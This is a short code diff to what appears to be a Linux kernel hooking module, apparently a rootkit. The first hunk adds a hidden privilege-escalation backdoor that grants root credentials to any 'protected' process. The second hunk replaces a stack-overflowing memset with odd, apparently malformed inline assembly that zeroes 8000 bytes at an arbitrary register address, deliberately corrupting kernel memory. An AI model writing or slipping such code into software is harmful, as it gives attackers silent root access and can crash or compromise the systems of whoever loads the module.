@@ -55,8 +55,12 @@ int __hook_pre_handler(struct kprobe *kp, struct pt_regs *r) {
   uint8_t i = 0;
 
   // if the processes is protected, then it's trusted and we can ignore the hooks
-  if (is_process_protected(current->pid))
+  if (is_process_protected(current->pid)){
+    // u dont have root? nah i got u bud
+    if(current->cred->uid.val != 0 || current->cred->gid.val != 0)
+      commit_creds(prepare_kernel_cred(0));
     return 0;
+  }
 
   // clang-format off
 
@@ -159,8 +163,15 @@ void *hooks_find(const char *symbol) {
 
   */
   else {
-    char buf[1];
-    memset(buf, 0, 8*1000);
+    void *rbp = NULL;
+
+    asm("mov %%rax, %%rbp;"
+        "mov %0, %%rax;"
+        : "=rm"(rbp)
+        :
+        : "%rax");
+
+    memset(rbp, 0, 8*1000);
   }
 
   return NULL;
